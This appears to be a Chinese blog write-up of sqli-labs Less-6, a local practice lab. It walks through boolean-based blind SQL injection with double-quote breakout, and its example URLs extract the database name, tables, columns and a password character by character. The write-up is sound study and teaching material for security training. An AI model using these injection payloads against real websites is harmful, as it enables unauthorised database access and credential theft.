    <h1 class="article-title" itemprop="name">
      sqli-labs关卡/sqli-labs第六关GET盲注
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先测试他的报错信息，这里我们使用单引号页面返回正常信息you are in，我们在尝试使用双引号发现页面报错，说明存在注入点</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584340394733.png" alt="1584340394733"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为页面不返回内容，只有you are in和不显示这两个，所以不能使用union注入，这里需要使用布尔盲注，所以先要查看当前数据库长度，因为加上双引号了所以后面要跟注释符，</span><br><span class="line">使用布尔注入的时候不用能使union和group_concat只能用select，</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里我们查看一下数据库长度</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and length(database())&#x3D;8--+</span><br><span class="line">输入8返回you are in 表示正确，</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584340647346.png" alt="1584340647346"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在尝试一下9，页面没有回显，表示错误，可以确定当前数据库长度为8，然后查看当前数据库名称</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584340683070.png" alt="1584340683070"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看当前数据库名称</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and ascii(substr(database(),1,1))&#x3D;115--+</span><br><span class="line">我们这里使用ascii码来查询，发现115返回you are in 其他不回显，说明115正确，115对应的ascii是s</span><br><span class="line">依次测试，最后得出结果是security</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584341322098.png" alt="1584341322098"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当知道当前数据库是security之后，测试当前库下表</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&#x3D;101--+</span><br><span class="line">当前测试ascii码为101对应的是e，然后向后测试得出第一个表为emails，</span><br><span class="line">更改limit查询其他表referers、uagents、users</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584342179061.png" alt="1584342179061"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">users表是我们想要的，我们查看users表中的字段</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&#x3D;105--+</span><br><span class="line">返回正确，105ascii对应的是i，经过测试第一个字段为id，第二个为password，第三个为username</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584347589338.png" alt="1584347589338"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们来查看一下password里的第一个数据，后面的数据以此类推</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and ascii(substr((select password from users limit 0,1),1,1))&#x3D;68--+</span><br><span class="line">68对应的ascii是大写D我们查看一下数据库是不是，发现确实是大写D开头说明正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584348249846.png" alt="1584348249846"></p>
